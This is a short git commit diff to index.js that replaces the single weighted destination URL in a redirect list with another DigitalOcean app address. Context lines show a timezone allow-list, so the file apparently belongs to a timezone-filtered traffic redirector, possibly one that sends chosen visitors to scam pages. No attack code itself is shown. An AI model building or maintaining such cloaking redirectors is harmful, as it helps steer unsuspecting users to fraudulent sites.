6346308979186711b56a51e1805bafe3c679c429
paalakash <palaksh452@gmail.com>
2026-07-03 09:16:47 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://plankton-app-2-i2gue.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://walrus-app-n4fg6.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
